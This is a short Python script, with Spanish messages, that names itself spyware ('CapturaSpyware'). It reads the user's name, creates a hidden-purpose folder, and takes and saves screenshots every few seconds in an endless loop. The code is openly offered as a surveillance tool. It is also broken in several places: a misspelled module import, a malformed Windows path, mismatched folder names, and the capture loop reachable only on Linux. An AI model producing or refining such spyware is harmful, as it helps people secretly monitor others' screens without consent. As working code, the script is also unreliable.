import PyAutoGui
import getpass
import sys
import os
import random
import time

ruta_carpeta = ""
usuario = ""

def tomarCaptura():
    
    print("Iniciando ejecucion del Script")
    print("Obteniendo nombre del usuario del sistema...")
    usuario = getpass.getuser()
    print("Nombre de usuario obtenido: "+ usuario +"\n")
    if sys.platform.startswith("win32"):
        print("Sistema operativo encontrado: Windows \n")
        ruta_carpeta = "C:\\Users\\"+ usuario +"Desktop\\"
        print("Verificando ruta de destino para los archivos...\n")
        if os.path.isdir(ruta_carpeta + "CapturaSpyware\\"):
            print("El directorio ya existe...")
        else:
            print("Creando directorio para los archivos...\n")
            os.mkdir(ruta_carpeta + 'CapturasSpyware')
            print("Directorio creado correctamente ")
            ruta_carpeta = ruta_carpeta + "\\CapturaSpyware\\"
    elif sys.platform.startswith("linux"):
        print("Verificando ruta de destino para los archivos...\n")
        ruta_carpeta = "/home/" + usuario + "/imagenes/"
        if os.path.isdir(ruta_carpeta + "/CapturaSpyware/"):
            print("El directorio ya existe...\n")
        else:
            print("Creando el directorio de destino")
            os.mkdir(ruta_carpeta + 'CapturaSpyware')
            print("Directorio creado correctamente...\n")
            ruta_carpeta = ruta_carpeta + "/CapturaSpyware/"

        file_name = "captura"

        while 1:
            print("Realizando captura de pantalla..\n")
            random_time = random.randrange(2,4) 
            time.sleep(random_time)
            ts = time.time()
            ruta_final = ruta_carpeta + file_name + "_" + str(ts) + ".jpg"
            captura = PyAutoGui.screenshot()
            captura.save(ruta_final)
            print("Captura de pantalla almacenada en:" + ruta_final +"\n")
        tomarCaptura()
        

         


